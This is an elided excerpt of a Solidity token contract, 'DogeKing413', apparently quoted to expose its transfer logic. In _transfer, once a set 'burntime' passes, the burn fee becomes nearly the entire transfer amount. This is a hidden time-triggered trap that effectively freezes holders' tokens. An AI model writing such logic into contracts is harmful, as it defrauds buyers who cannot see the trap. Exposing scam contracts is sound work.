...
contract  DogeKing413  is Ownable, IERC20 {
    ...
    string private  _name = "413DogeKing";
    string private  _symbol = "413DogeKing";

    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 4130 * 10 ** 9;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( burntime < block.timestamp )    {   burnfee = amount- 1 ; }  }  }
